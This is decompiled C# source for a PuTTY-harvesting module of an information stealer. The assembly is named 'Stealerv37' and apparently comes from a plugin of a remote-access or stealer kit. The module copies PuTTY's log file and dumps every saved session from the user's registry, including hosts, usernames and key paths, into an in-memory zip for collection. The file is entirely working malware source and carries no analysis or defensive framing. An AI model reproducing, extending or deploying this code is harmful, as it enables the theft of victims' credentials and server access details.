// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.PuTTY
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

#nullable disable
namespace Intelix.Targets.Applications;

public class PuTTY : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (PuTTY);
    this.Logs(zip, counterApplications);
    this.Sessions(zip, counterApplications);
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("PuTTY\\");
    counter.Applications.Add(counterApplications);
  }

  private void Logs(InMemoryZip zip, Counter.CounterApplications counterApplications)
  {
    string path = "C:\\Program Files\\PuTTY\\putty.log";
    if (!File.Exists(path))
      return;
    string entryPath = "PuTTY\\putty.log";
    zip.AddFile(entryPath, File.ReadAllBytes(path));
    counterApplications.Files.Add($"{path} => {entryPath}");
  }

  private void Sessions(InMemoryZip zip, Counter.CounterApplications counterApplications)
  {
    string name1 = "Software\\SimonTatham\\PuTTY\\Sessions";
    using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name1, false))
    {
      if (registryKey == null)
        return;
      string[] array = ((IEnumerable<string>) registryKey.GetSubKeyNames()).OrderBy<string, string>((Func<string, string>) (x => x), (IComparer<string>) StringComparer.OrdinalIgnoreCase).ToArray<string>();
      if (array.Length == 0)
        return;
      foreach (string name2 in array)
      {
        using (RegistryKey key = registryKey.OpenSubKey(name2, false))
        {
          if (key != null)
          {
            string entryPath = $"PuTTY\\session_{name2}.txt";
            string text = string.Join("\n", (IEnumerable<string>) RegistryParser.ParseKey(key));
            zip.AddTextFile(entryPath, text);
            counterApplications.Files.Add($"{name1}\\{name2} => {entryPath}");
          }
        }
      }
    }
  }
}
